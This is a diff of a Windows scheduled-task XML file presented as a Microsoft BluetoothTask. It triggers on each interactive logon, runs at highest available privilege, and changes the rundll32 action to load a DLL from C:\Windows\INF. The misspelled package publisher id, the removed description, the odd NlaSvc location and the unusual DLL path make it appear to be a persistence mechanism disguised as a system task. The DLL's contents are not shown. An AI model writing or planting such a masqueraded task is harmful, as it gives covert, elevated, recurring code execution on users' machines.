@@ -4,15 +4,12 @@
     <Source>Microsoft Corporation</Source>
     <Author>Microsoft Corporation</Author>
     <Version>1.0</Version>
-    <Description />
-    <URI>\Microsoft\Windows\NlaSvc\BluetoothTask</URI> 
+    <URI>\Microsoft\Windows\NlaSvc\BluetoothTask</URI>
   </RegistrationInfo>
-
   <Triggers>
     <EventTrigger>
       <Enabled>true</Enabled>
-      <Subscription>
-        &lt;QueryList&gt;
+      <Subscription>&lt;QueryList&gt;
           &lt;Query Id="0" Path="Security"&gt;
             &lt;Select Path="Security"&gt;
               *[System[(EventID=4624)]]
@@ -20,18 +17,15 @@
               *[EventData[Data[@Name='LogonType']='2']]
             &lt;/Select&gt;
           &lt;/Query&gt;
-        &lt;/QueryList&gt;
-      </Subscription>
+        &lt;/QueryList&gt;</Subscription>
     </EventTrigger>
   </Triggers>
-
   <Principals>
     <Principal id="Users">
-      <GroupId>S-1-5-4</GroupId>
       <RunLevel>HighestAvailable</RunLevel>
+      <GroupId>INTERACTIVE</GroupId>
     </Principal>
   </Principals>
-
   <Settings>
     <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
     <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
@@ -50,14 +44,13 @@
     <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
     <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
     <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
+    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
     <Priority>7</Priority>
   </Settings>
-
   <Actions Context="Users">
     <Exec>
-      <Command>%windir%\system32\rundll32.exe</Command> 
-      <Arguments>"C:\Program Files\WindowsApps\Microsoft.Bluetooth_2026.423.716.0_neutral_8wakyb3d8bbwe\BluetoothTask.dll",BluetoothTask</Arguments> 
+      <Command>%windir%\system32\rundll32.exe</Command>
+      <Arguments>"C:\Windows\INF\BluetoothTask.dll",BluetoothTask</Arguments>
     </Exec>
   </Actions>
 </Task>
